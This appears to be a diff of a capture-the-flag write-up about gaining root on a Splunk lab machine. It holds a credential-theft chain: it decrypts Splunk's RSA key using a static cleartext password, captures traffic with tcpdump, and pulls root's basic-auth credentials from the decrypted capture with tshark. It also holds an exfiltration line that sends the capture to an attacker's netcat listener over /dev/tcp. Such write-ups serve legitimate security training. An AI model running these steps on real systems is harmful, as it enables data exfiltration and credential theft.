@@ -47,15 +47,15 @@ Running `sudo -l`, we find we can run `tcpdump` on localhost and can list direct
 
 <img src="images/sslpass.png">
 
-The password used to encrypt the above RSA key is static across splunk instances however and is in cleartext in `/opt/splunk/etc/system/default/server.pem`. I'll copy the key over to my box in a file `enc.pem` and run `openssl rsa -in enc.pem -out dec.pem` which will prompt me for the `sslPassword` and write the decrypted key to `dec.pem`
+The password used to encrypt the above RSA key is static across splunk instances however and is in cleartext in `/opt/splunk/etc/system/default/server.pem`. 
 
 <img src="images/traffic.png">
 
-Back on the box I let `tcpdump` run for a short while and sent the output to `output.pcap`. I can copy this file to the host by running `nc -nvlp 7777 >
+With my other `sudo` privilege, I'll run `tcpdump` for a short while and send the output to `output.pcap`. I can exfil this file by running `nc -nvlp 7777 >
 output.pcap` on my box and `cat output.pcap > /dev/tcp/172.18.0.1/7777` on the victim.
 
 <img src="images/rootcreds.png">
 
-Now I'll use `tshark` to try and decrypt the traffic using the plaintext RSA private key. 'Grepping' for known headers, we can spot the basic authorization header which reveals root's credentials. Run `su -` and its job done.
+I'll copy the key over to my box in a file `enc.pem` and run `openssl rsa -in enc.pem -out dec.pem` which will prompt me for the `sslPassword` and write the decrypted key to `dec.pem`. Now I'll use `tshark` to try and decrypt the traffic using the plaintext RSA private key. 'Grepping' for known headers, we can spot the basic authorization header which reveals root's credentials. Run `su -` and its job done.
 
 Finally run `sudo iptables -D OUTPUT -s 172.18.0.1 -d 172.18.0.3 -j DROP` to delete the iptables rule set in `start.sh`.
